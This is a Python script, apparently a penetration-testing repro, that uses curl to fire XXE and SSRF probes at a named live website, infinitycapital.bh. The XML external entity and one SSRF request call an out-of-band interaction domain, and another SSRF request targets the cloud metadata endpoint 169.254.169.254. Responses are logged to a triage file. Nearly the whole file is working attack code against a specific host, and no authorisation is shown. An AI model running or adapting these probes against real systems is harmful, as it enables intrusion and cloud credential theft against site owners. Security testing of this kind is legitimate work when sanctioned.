import subprocess, os

BASE = "https://www.infinitycapital.bh"
OUT = "tool_outputs"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
HOST = "oob9a3453c4bdc1"
DOM  = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
HOST2 = "oobd87c526acc6d"

xxe = ('<?xml version="1.0" encoding="UTF-8"?>\n'
       '<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://' + HOST + '.' + DOM + '/xxe-repro"> ]>\n'
       '<r>&xxe;</r>')

log = []
def run(desc, args):
    r = subprocess.run(["curl","-sk","-m","15","-A",UA,"-w","\\nHTTP:%{http_code} CT:%{content_type} SIZE:%{size_download}\\n"]+args,
                       capture_output=True, text=True)
    log.append("### %s\nEXIT: %s\n%s\n%s" % (desc, r.returncode, r.stdout[:1200], r.stderr[:300]))
    print("### "+desc+" => "+r.stdout[:160].replace("\n"," "), flush=True)

open("/tmp/x.xml","w").write(xxe)
run("XXE-repro POST /api/ multipart file=xml", ["-X","POST","-F","file=@/tmp/x.xml;type=application/xml",BASE+"/api/"])
run("XXE-repro POST /api/ raw xml body", ["-X","POST","-H","Content-Type: application/xml","--data-binary","@/tmp/x.xml",BASE+"/api/"])
run("XXE-repro POST /404 raw xml body", ["-X","POST","-H","Content-Type: application/xml","--data-binary","@/tmp/x.xml",BASE+"/404"])
run("XXE-repro POST /atom.xml raw xml body", ["-X","POST","-H","Content-Type: text/xml","--data-binary","@/tmp/x.xml",BASE+"/atom.xml"])
run("SSRF-repro /_next/image?url=OOB", ["-G","--data-urlencode","url=http://"+HOST2+"."+DOM+"/ssrf.png","--data","w=1080","--data","q=75",BASE+"/_next/image"])
run("SSRF-repro /_next/image?url=metadata", ["-G","--data-urlencode","url=http://169.254.169.254/latest/meta-data/","--data","w=1080","--data","q=75",BASE+"/_next/image"])
run("baseline GET /_next/image", [BASE+"/_next/image"])
run("baseline GET /api/", [BASE+"/api/"])
run("baseline GET /404", [BASE+"/404"])
open(OUT+"/triage_repro.log","w").write("\n".join(log))
print("DONE")
